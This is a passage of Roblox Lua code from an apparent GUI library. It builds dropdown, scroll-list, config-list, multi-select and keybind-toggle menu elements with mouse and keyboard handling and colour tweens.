								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 

								function Element:SetValue(tbl)
									oldElement = Element.value.UpdateValue
									Element.value = tbl 
									Element.value['UpdateValue'] = oldElement
									abcd.Text = tbl.Dropdown 
									values[tabname][sectorname][text] = Element.value 
									for i,v in pairs(Dropdown:GetChildren()) do 
										if v:IsA("Frame") then 
											if v.Name == Element.value.Dropdown then 
												v.Visible = true 
											else 
												v.Visible = false 
											end 
											for _,bad in pairs(v.Frame:GetChildren()) do 
												if bad:IsA("TextButton") then 
													bad.TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
													if bad.Name == Element.value.Scroll[v.Name] then 
														bad.TextLabel.TextColor3 = getMainColor() 
														function MenuAccent(color)
															bad.TextLabel.TextColor3 = color
														end
													end 
												end 
											end 
										end 
									end 
								end 

								if data.default then 
									Element:SetValue(data.default) 
								end 

								values[tabname][sectorname][text] = Element.value 

							elseif type == "Scroll" then 
								local amount = data.Amount or 6 
								Section.Size = Section.Size + C.UDIM2(0,0,0,amount * 16 + 8) 
								if data.alphabet then 
									C.TBLSORT(data.options, function(a,b) 
										return a < b 
									end) 
								end 
								Element.value = {Scroll = data.default and data.default.Scroll or data.options[1]} 

								local Scroll = C.INST("Frame") 
								local Frame = C.INST("ScrollingFrame") 
								local UIListLayout = C.INST("UIListLayout") 

								Scroll.Name = "Scroll" 
								Scroll.Parent = Inner 
								Scroll.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Scroll.BackgroundTransparency = 1.000 
								Scroll.Position = C.UDIM2(0, 0, 00, 0) 
								Scroll.Size = C.UDIM2(1, 0, 0, amount * 16 + 8) 


								Frame.Name = "Frame" 
								Frame.Parent = Scroll --  
								Frame.Active = true 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(0, 30, 0, 0) 
								Frame.Size = C.UDIM2(0, 175, 0, 16 * amount) 
								Frame.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Frame.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.ScrollBarThickness = 4 
								Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.AutomaticCanvasSize = "Y" 
								Frame.ScrollBarImageColor3 = getMainColor() 
														function MenuAccent(color)
															Frame.ScrollBarImageColor3 = color
														end
								UIListLayout.Parent = Frame 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
								local first = true 
								for i,v in ipairs(data.options) do 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 

									Button.Name = v 
									Button.Parent = Frame 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.BorderSizePixel = 0 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(1, 0, 0, 16) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 4, 0, -1) 
									TextLabel.Size = C.UDIM2(1, 1, 1, 1) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = v 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
									if first then first = false 
										TextLabel.TextColor3 = getMainColor()
										function MenuAccent(color)
											TextLabel.TextColor3 = getMainColor()
										end								
									end 
									Button.MouseButton1Down:Connect(function() 
										for i,v in pairs(Frame:GetChildren()) do 
											if v:IsA("TextButton") then 
												library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
											end
										end
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()})
										Element.value.Scroll = v
										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end) 
									Button.MouseEnter:Connect(function() 
										if Element.value.Scroll ~= v then 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
										end 
									end) 
									Button.MouseLeave:Connect(function() 
										if Element.value.Scroll ~= v then 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end) 
								end
								function Element:SetValue(val) 
									Element.value = val 
									for i,v in pairs(Frame:GetChildren()) do 
										if v:IsA("TextButton") then 
											library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end 
									library:Tween(Frame[Element.value.Scroll].TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 
								values[tabname][sectorname][text] = Element.value
							elseif type == "cfgtype" then 
							local amount = data.Amount or 6 
								Section.Size = Section.Size + C.UDIM2(0,0,0,amount * 16 + 8) 
								if data.alphabet then 
									C.TBLSORT(data.options, function(a,b) 
										return a < b 
									end) 
								end 
								Element.value = {Scroll = data.default and data.default.Scroll or data.options[1]}

								local Scroll = C.INST("Frame") 
								local Frame = C.INST("ScrollingFrame") 
								local UIListLayout = C.INST("UIListLayout") 

								Scroll.Name = "Scroll" 
								Scroll.Parent = Inner 
								Scroll.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Scroll.BackgroundTransparency = 1.000 
								Scroll.Position = C.UDIM2(0, 0, 00, 0) 
								Scroll.Size = C.UDIM2(1, 0, 0, amount * 16 + 8) 


								Frame.Name = "Frame" 
								Frame.Parent = Scroll --  
								Frame.Active = true 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(0, 30, 0, 0) 
								Frame.Size = C.UDIM2(0, 175, 0, 16 * amount) 
								Frame.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Frame.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.ScrollBarThickness = 4 
								Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.AutomaticCanvasSize = "Y" 
								Frame.ScrollBarImageColor3 = getMainColor() 
function MenuAccent(color)
Frame.ScrollBarImageColor3 = color
end
								UIListLayout.Parent = Frame 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
								local first = true 
ConfigUpdateCfgList:Connect(function()
								for i,v in ipairs(data.options) do 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 

									Button.Name = v 
									Button.Parent = Frame 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.BorderSizePixel = 0 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(1, 0, 0, 16) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 4, 0, -1) 
									TextLabel.Size = C.UDIM2(1, 1, 1, 1) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = v 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
									if first then first = false 
										TextLabel.TextColor3 = getMainColor() 

									end 
 ConfigUpdateCfgList2:Connect(function()
Button:Destroy()
TextLabel:Destroy()
end)
									Button.MouseButton1Down:Connect(function() 

										for i,v in pairs(Frame:GetChildren()) do 
											if v:IsA("TextButton") then 
												library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
											end 
										end 

										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 

										Element.value.Scroll = v 

										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end) 
									Button.MouseEnter:Connect(function() 
										if Element.value.Scroll ~= v then 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
										end 
									end) 
									Button.MouseLeave:Connect(function() 
										if Element.value.Scroll ~= v then 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end) 
								end
end)
ConfigUpdateCfgList:Fire()

								function Element:SetValue(val) 
									Element.value = val 

									for i,v in pairs(Frame:GetChildren()) do 
										if v:IsA("TextButton") then 
											library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end 

									library:Tween(Frame[Element.value.Scroll].TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 
								values[tabname][sectorname][text] = Element.value								
							elseif type == "Jumbobox" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Jumbobox = {}} 
								data.options = data.options or {} 

								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(33, 35, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = "..." 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								--Drop.AutomaticCanvasSize = "Y" 
								for i,v in pairs(data.options) do 
									Drop.CanvasSize = Drop.CanvasSize + C.UDIM2(0, 0, 0, 17) 
								end 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = getMainColor() 

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

								values[tabname][sectorname][text] = Element.value 

								local num = #data.options 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 

								local function updatetext() 
									local old = {} 
									for i,v in ipairs(data.options) do 
										if C.TBLFIND(Element.value.Jumbobox, v) then 
											C.INSERT(old, v) 
										else 
										end 
									end 
									local str = "" 


									if #old == 0 then 
										str = "..." 
									else 
										if #old == 1 then 
											str = old[1] 
										else 
											for i,v in ipairs(old) do 
												if i == 1 then 
													str = v 
												else 
													if i > 2 then 
														if i < 4 then 
															str = str..",  ..." 
														end 
													else 
														str = str..",  "..v 
													end 
												end 
											end 
										end 
									end 

									abcd.Text = str 
								end 
								for i,v in ipairs(data.options) do 
									do 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											if C.TBLFIND(Element.value.Jumbobox, v) then 
												for i,a in pairs(Element.value.Jumbobox) do 
													if a == v then 
														C.TBLREMOVE(Element.value.Jumbobox, i) 
													end 
												end 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
											else 
												C.INSERT(Element.value.Jumbobox, v) 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
											end 
											updatetext() 

											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
										end) 
										Button.MouseEnter:Connect(function() 
											if not C.TBLFIND(Element.value.Jumbobox, v) then 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
											end 
										end) 
										Button.MouseLeave:Connect(function() 
											if not C.TBLFIND(Element.value.Jumbobox, v) then 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
											end 
										end) 

										first = false 
									end 
								end 
								function Element:SetValue(val) 
									Element.value = val 
									for i,v in pairs(Drop:GetChildren()) do 
										if v.Name ~= "UIListLayout" then 
											if C.TBLFIND(val.Jumbobox, v.Name) then 
												v.TextLabel.TextColor3 = getMainColor() 
											else 
												v.TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											end 
										end 
									end 
									updatetext() 
									values[tabname][sectorname][text] = Element.value 
									callback(val) 
								end 
								if data.default then 
									Element:SetValue(data.default) 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 
							elseif type == "ToggleKeybind" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,16) 
								Element.value = {Toggle = data.default and data.default.Toggle or false, Key = data.default and data.default.Key or nil, Type = data.default and data.default.Type or "Always", Active = true} 
								if Element.value.Type == 'Toggle' and Element.value.Key ~= nil then
									keybindadd(text,Element.value.Key)
								end
								local Toggle = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local Color = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								Button.Name = "Button" 
								Button.Parent = Toggle 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Size = C.UDIM2(1, 0, 1, 0) 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Color.Name = "Color" 
								Color.Parent = Button 
								Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Color.Position = C.UDIM2(0, 15, 0.5, -5) 
								Color.Size = C.UDIM2(0, 8, 0, 8) 
								local binding = false 
								TextLabel.Parent = Button
								TextLabel.Name = 'CheckerINeed'
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local function update() 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = getMainColor()}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										keybindremove(text, Element.value.Key) 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 

								Button.MouseButton1Down:Connect(function() 
									if not binding then 
										Element.value.Toggle = not Element.value.Toggle 
										update() 
										if Element.value.Key ~= nil and Element.value.Toggle then 
											keybindadd(text, Element.value.Key) 
										end 
										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end 
								end) 
								if data.default then 
									update() 
								end 
								values[tabname][sectorname][text] = Element.value 
								do 
									local Keybind = C.INST("TextButton") 
									local Frame = C.INST("Frame") 
									local Always = C.INST("TextButton") 
									local UIListLayout = C.INST("UIListLayout") 
									local Hold = C.INST("TextButton") 
									local Toggle = C.INST("TextButton") 
									local ButtonKey = C.INST('TextButton')

									Keybind.Name = "Keybind" 
									Keybind.Parent = Button 
									Keybind.BackgroundColor3 = C.COL3RGB(31, 31, 31) 
									Keybind.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Keybind.Position = C.UDIM2(0, 270, 0.5, -6) 
									Keybind.Text = data.default and data.default.Key or 'NONE'
									Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.SourceSansSemibold, C.Vec2(700, 12)).X + 5,0, 12)
									
									Keybind.AutoButtonColor = false 
									Keybind.Font = Enum.Font.Gotham 
									Keybind.TextColor3 = C.COL3RGB(200, 200, 200) 
									Keybind.TextSize = 11.000
									Keybind.AnchorPoint = C.Vec2(1,0) 
									Keybind.ZIndex = 3 

									Frame.Parent = Keybind 
									Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Frame.Position = C.UDIM2(1, -49, 0, 1) 
									Frame.Size = C.UDIM2(0, 49, 0, 49) 
									Frame.Visible = false 
									Frame.ZIndex = 3 

									Always.Name = "Always" 
									Always.Parent = Frame 
									Always.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Always.BackgroundTransparency = 1.000 
									Always.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Always.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Always.Size = C.UDIM2(1, 0, 0, 16) 
									Always.AutoButtonColor = false 
									Always.Font = Enum.Font.SourceSansBold 
									Always.Text = "Always" 
									Always.TextColor3 = C.COL3RGB(173, 24, 72) 
									Always.TextSize = 11.000
									Always.ZIndex = 3 

									UIListLayout.Parent = Frame 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

									Hold.Name = "Hold" 
									Hold.Parent = Frame 
									Hold.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Hold.BackgroundTransparency = 1.000 
									Hold.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Hold.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Hold.Size = C.UDIM2(1, 0, 0, 16) 
									Hold.AutoButtonColor = false 
									Hold.Font = Enum.Font.Gotham 
									Hold.Text = "Hold" 
									Hold.TextColor3 = C.COL3RGB(200, 200, 200) 
									Hold.TextSize = 11.000
									Hold.ZIndex = 3 

									Toggle.Name = "Toggle" 
									Toggle.Parent = Frame 
									Toggle.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Toggle.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Toggle.Size = C.UDIM2(1, 0, 0, 16) 
									Toggle.AutoButtonColor = false 
									Toggle.Font = Enum.Font.Gotham 
									Toggle.Text = "Toggle" 
									Toggle.TextColor3 = C.COL3RGB(200, 200, 200) 
									Toggle.TextSize = 11.000
									Toggle.ZIndex = 3 

									for _,button in pairs(Frame:GetChildren()) do 
										if button:IsA("TextButton") then 
											button.MouseButton1Down:Connect(function() 
												Element.value.Type = button.Text 
												Frame.Visible = false 
												if Element.value.Active ~= (Element.value.Type == "Always" and true or false) then 
													Element.value.Active = Element.value.Type == "Always" and true or false 
													callback(Element.value) 
												end 
												if button.Text == "Always" then 
													keybindremove(text, Element.value.Key) 
												end 
												for _,button in pairs(Frame:GetChildren()) do 
													if button:IsA("TextButton") and button.Text ~= Element.value.Type then 
														button.Font = Enum.Font.Gotham 
														library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
													end 
												end 
												button.Font = Enum.Font.SourceSansBold 
												button.TextColor3 = C.COL3RGB(173, 24, 74) 
												values[tabname][sectorname][text] = Element.value 
											end) 
											button.MouseEnter:Connect(function() 
												if Element.value.Type ~= button.Text then 
													library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255,255,255)}) 
												end 
											end) 
											button.MouseLeave:Connect(function() 
												if Element.value.Type ~= button.Text then 
													library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
												end 
											end) 
										end 
									end 
									Keybind.MouseButton1Down:Connect(function() 
										if not binding then 
											wait() 
											binding = true
											Keybind.Text = "..." 
											Keybind.Size = C.UDIM2(0,txt:GetTextSize("...", 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
										end 
									end) 
									Keybind.MouseButton2Down:Connect(function() 
										if not binding then 
											Frame.Visible = not Frame.Visible 
										end 
									end) 
									local Player = game.Players.LocalPlayer 
									local Mouse = Player:GetMouse() 
									local InFrame = false 
									Frame.MouseEnter:Connect(function() 
										InFrame = true 
									end) 
									Frame.MouseLeave:Connect(function() 
										InFrame = false 
									end) 
									local InFrame2 = false 
									Keybind.MouseEnter:Connect(function() 
										InFrame2 = true 
									end) 
									Keybind.MouseLeave:Connect(function() 
										InFrame2 = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 and not binding then 
											if Frame.Visible == true and not InFrame and not InFrame2 then 
												Frame.Visible = false 
											end 
										end 
										if binding then 
											binding = false 
											Keybind.Text = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name:upper() or input.UserInputType.Name:upper() 
											Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 5,0, 12) 
											Element.value.Key = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name or input.UserInputType.Name 
											if Element.value.Key ~= nil and Element.value.Toggle then 
												keybindadd(text, Element.value.Key) 
											end 
											if input.KeyCode.Name == "Backspace" then 
												Keybind.Text = "none" 
												Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
												Element.value.Key = nil 
												Element.value.Active = true 
												keybindremove2(text)
											end 
											callback(Element.value) 
										else 
											if Element.value.Key ~= nil then 
												if C.FIND(Element.value.Key, "Mouse") then 
													if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
														if Element.value.Type == "Hold" then 
															Element.value.Active = true 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														elseif Element.value.Type == "Toggle" then 
															Element.value.Active = not Element.value.Active 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindtoggle(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end 
														end
													end 
												else 
